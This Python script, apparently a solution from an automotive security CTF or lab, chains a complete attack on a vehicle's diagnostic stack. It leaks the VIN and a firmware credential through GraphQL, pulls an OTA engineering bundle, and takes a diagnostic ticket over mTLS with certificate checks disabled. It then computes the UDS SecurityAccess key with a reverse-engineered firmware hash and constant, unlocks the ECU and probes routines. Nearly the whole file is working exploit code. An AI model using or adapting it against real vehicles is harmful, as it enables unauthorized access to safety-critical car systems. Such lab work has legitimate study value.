#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
任务 04：恢复 64 位 DoIP/UDS SecurityAccess（已打通，可重放）

完整链路：
  1) DoIP VehicleIdentification (0x0001)  -> VIN
  2) RoutingActivation (0x0005, SA=0x0E00, type=0x00) -> code 0x10
  3) 10 03 扩展会话  -> 50 03   （目标：功能地址 0xE442 -> UDS 节点 0x1220）
  4) 2E F1A1 + **ASCII 票据字符串** -> 6E F1A1      ← 票据绑定（关键：必须是 ASCII，不是二进制！）
  5) 27 01 -> 67 01 <8字节 seed>
  6) key = hash8(seed, SHA256(VIN)[:8], C_DEV)      ← 固件 0x08000668，双 lane
  7) 27 02 <key> -> 67 02                            ← 解锁成功

关键点（都是踩过的坑）：
  * 票据必须按 **base64url 字符串原文（54 或 64 字符 ASCII）** 写入 DID F1A1，
    不是 base64 解码后的 40 字节二进制。用二进制会得到 7F 2E 35 (invalidKey)。
  * 票据 TTL 精确 600 秒，过期后 2E F1A1 同样回 35。每轮必须重新取票。
  * 工程包每次下载重新签发客户端证书；取票用的是该证书的 mTLS 会话。
  * hash8 的 second input 固定为 SHA256(VIN)[:8]；C 为固件常量 0x08002020 = e224dd2bb23a15b8。
  * hash8 对 A/B 对称（只依赖 A^B），lane 是函数内部 i=0,1 两个 32-bit 分支。

用法:
    python solve_task04.py                 # 完整流程 + 解锁后能力探测
    python solve_task04.py --vin <VIN>
"""
import argparse, base64, hashlib, json, socket, ssl, struct, sys, time

# ---------- 靶机地址（重启后会变，按需改） ----------
TSP      = "10.225.139.2:8080"
TBOX_OTA = "10.225.139.3:8080"
TBOX_TLS = ("10.225.139.3", 8443)
CGW      = ("10.226.193.2", 13400)

TARGET_LA = 0xE442          # 功能地址 -> 转发到 UDS 节点 0x1220
TESTER_SA = 0x0E00
DID_BIND  = 0xF1A1          # 票据绑定槽（只写，读回 31）

# ---------- 固件 0x08000668 的 keyed hash（双 lane） ----------
GOLD, M1, M2, K5 = 0x9E3779B9, 0x7FEB352D, 0x846CA68B, 0xA5A5A5A5
C_DEV = bytes.fromhex("e224dd2bb23a15b8")   # 固件 @0x08002020

def _lowbias32(x: int) -> int:
    x &= 0xFFFFFFFF
    x ^= x >> 16; x = (x * M1) & 0xFFFFFFFF
    x ^= x >> 15; x = (x * M2) & 0xFFFFFFFF
    x ^= x >> 16
    return x & 0xFFFFFFFF

def hash8(A: bytes, B: bytes, C: bytes = C_DEV) -> bytes:
    """固件 0x08000668：双 lane，8B×2 输入 -> 8B 输出。只依赖 A^B。"""
    out = []
    for i in range(2):
        a = struct.unpack("<I", A[4*i:4*i+4])[0]
        b = struct.unpack("<I", B[4*i:4*i+4])[0]
        c = struct.unpack("<I", C[4*i:4*i+4])[0]
        x = _lowbias32(a ^ b ^ c ^ (((i+1) * GOLD) & 0xFFFFFFFF))
        out.append((x + ((i+1) * K5)) & 0xFFFFFFFF)
    return struct.pack("<II", *out)

# ---------- DoIP ----------
def _pkt(ptype: int, payload: bytes = b"") -> bytes:
    return bytes([0x02, 0xFD]) + struct.pack(">H", ptype) + struct.pack(">I", len(payload)) + payload

def _recv(s):
    hdr = b""
    while len(hdr) < 8:
        c = s.recv(8 - len(hdr))
        if not c: return None
        hdr += c
    _, _, ptype, ln = struct.unpack(">BBHI", hdr)
    pl = b""
    while len(pl) < ln:
        c = s.recv(ln - len(pl))
        if not c: break
        pl += c
    return ptype, pl

class DoIP:
    def __init__(self, host=CGW[0], port=CGW[1], sa=TESTER_SA, timeout=4.0):
        self.host, self.port, self.sa, self.timeout = host, port, sa, timeout
        self.s = None

    def connect(self):
        self.s = socket.socket(); self.s.settimeout(self.timeout)
        self.s.connect((self.host, self.port)); return self

    def close(self):
        if self.s: self.s.close(); self.s = None

    def ident(self):
        self.connect(); self.s.sendall(_pkt(0x0001)); r = _recv(self.s); self.close()
        return r

    def ra(self, act=0x00):
        self.s.sendall(_pkt(0x0005, struct.pack(">H", self.sa) + bytes([act]) + b"\x00"*4))
        return _recv(self.s)

    def uds(self, data: bytes, ta=TARGET_LA, wait=1.2):
        self.s.sendall(_pkt(0x8001, struct.pack(">H", self.sa) + struct.pack(">H", ta) + data))
        out = []; old = self.s.gettimeout(); self.s.settimeout(wait)
        try:
            for _ in range(4):
                r = _recv(self.s)
                if r is None: break
                out.append(r)
                if r[0] == 0x8001: break
        except socket.timeout:
            pass
        finally:
            self.s.settimeout(old)
        for ptype, pl in out:
            if ptype == 0x8001 and len(pl) >= 5:
                return pl[4:].hex()
        return ""

# ---------- 取票据 ----------
def get_vin(tsp=TSP):
    import urllib.request
    req = urllib.request.Request(
        f"http://{tsp}/graphql",
        data=json.dumps({"query": "{ vehicleDiagnostics { vin } }",
                         "variables": {"vin": "__probe__"}}).encode(),
        headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=6) as r:
            j = json.loads(r.read())
        node = j.get("data", {}).get("vehicleDiagnostics")
        if node: return node.get("vin"), node.get("firmwareCredential")
    except Exception:
        pass
    return None, None

def diag_query(vin, tsp=TSP):
    import urllib.request
    req = urllib.request.Request(
        f"http://{tsp}/graphql",
        data=json.dumps({"query": "query { vehicleDiagnostics { vin } }",
                         "variables": {"vin": vin}}).encode(),
        headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=8) as r:
        return json.loads(r.read())["data"]["vehicleDiagnostics"]

def fetch_bundle(cred, tbox=TBOX_OTA, outdir="."):
    import urllib.request, base64 as b64
    auth = b64.b64encode(f"diag:{cred}".encode()).decode()
    req = urllib.request.Request(f"http://{tbox}/api/v1/ota/engineering-bundle",
                                 headers={"Authorization": "Basic " + auth})
    with urllib.request.urlopen(req, timeout=20) as r:
        return r.read()

def issue_ticket(certdir):
    """mTLS POST /api/v1/diag/session -> diagnosticTicket (ASCII)"""
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    ctx.load_cert_chain(f"{certdir}/client.pem", f"{certdir}/client-key.pem")
    s = ctx.wrap_socket(socket.create_connection(TBOX_TLS, timeout=10), server_hostname="tbox")
    s.sendall(b"POST /api/v1/diag/session HTTP/1.1\r\nHost: tbox\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
    body = b""
    while True:
        d = s.recv(4096)
        if not d: break
        body += d
    s.close()
    return json.loads(body.partition(b"\r\n\r\n")[2])

# ---------- 主流程 ----------
def unlock(vin, ticket_str, verbose=True):
    """执行 RA -> 10 03 -> 2E F1A1(ticket) -> 27 01 -> 27 02(key)"""
    d = DoIP().connect()
    ra = d.ra()
    if verbose: print(f"  RA           -> {ra[1].hex() if ra else None}")

    s = d.uds(bytes.fromhex("1003"))
    if verbose: print(f"  10 03        -> {s}")
    if not s.startswith("5003"): raise RuntimeError("extended session failed")

    s = d.uds(bytes.fromhex("2EF1A1") + ticket_str.encode("ascii"))
    if verbose: print(f"  2E F1A1+tick -> {s}")
    if not s.startswith("6ef1a1"): raise RuntimeError(f"ticket bind failed: {s}")

    s = d.uds(bytes.fromhex("2701"))
    if verbose: print(f"  27 01        -> {s}")
    if not s.startswith("6701"): raise RuntimeError(f"no seed: {s}")
    seed = bytes.fromhex(s[4:])

    key = hash8(seed[:8], hashlib.sha256(vin.encode()).digest()[:8], C_DEV)
    if verbose: print(f"  seed={seed.hex()}  key={key.hex()}")

    s = d.uds(bytes.fromhex("2702") + key)
    if verbose: print(f"  27 02        -> {s}")
    d.close()
    if not s.startswith("6702"): raise RuntimeError(f"sendKey failed: {s}")
    return seed, key

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--vin", default=None)
    ap.add_argument("--ticket", default=None, help="复用已有票据(ASCII)")
    ap.add_argument("--certdir", default=None, help="diagnostics 目录")
    ap.add_argument("--workdir", default="work/task04")
    args = ap.parse_args()

    import os, zipfile
    os.makedirs(args.workdir, exist_ok=True)

    # 1) VIN
    vin = args.vin
    if not vin:
        ident = DoIP().ident()
        vin = ident[1][:17].decode()
    print(f"[1] VIN = {vin}")

    # 2) 票据
    ticket = args.ticket
    if not ticket:
        node = diag_query(vin)
        print(f"[2] campaign={node['campaignId']}  cred={node['firmwareCredential'][:8]}...")
        blob = fetch_bundle(node["firmwareCredential"])
        zp = os.path.join(args.workdir, "bundle.zip")
        open(zp, "wb").write(blob)
        ex = os.path.join(args.workdir, "x")
        zipfile.ZipFile(zp).extractall(ex)
        certdir = args.certdir or os.path.join(ex, "diagnostics")
        j = issue_ticket(certdir)
        ticket = j["diagnosticTicket"]
        print(f"[3] ticket = {ticket}  ({len(ticket)} chars, TTL 600s)")
    else:
        print(f"[3] using supplied ticket ({len(ticket)} chars)")

    # 3) 解锁
    print("[4] unlock chain:")
    seed, key = unlock(vin, ticket)

    # 4) 解锁后能力探测
    print("[5] post-unlock probes:")
    d = DoIP().connect(); d.ra()
    d.uds(bytes.fromhex("2EF1A1") + ticket.encode())
    d.uds(bytes.fromhex("2701"))
    d.uds(bytes.fromhex("2702") + key)
    for label, uds_hex in [("22 F1A3", "22F1A3"), ("22 F190", "22F190"),
                           ("31 01 FF00", "3101FF00"), ("31 03 FF00", "3103FF00")]:
        print(f"  {label:12s} -> {d.uds(bytes.fromhex(uds_hex))}")
    d.close()
    print("\n[+] 解锁成功。下一步：在解锁态下扫 31 01 的 RID 找开桥例程（见 rid_sweep_unlocked.py）")

if __name__ == "__main__":
    main()
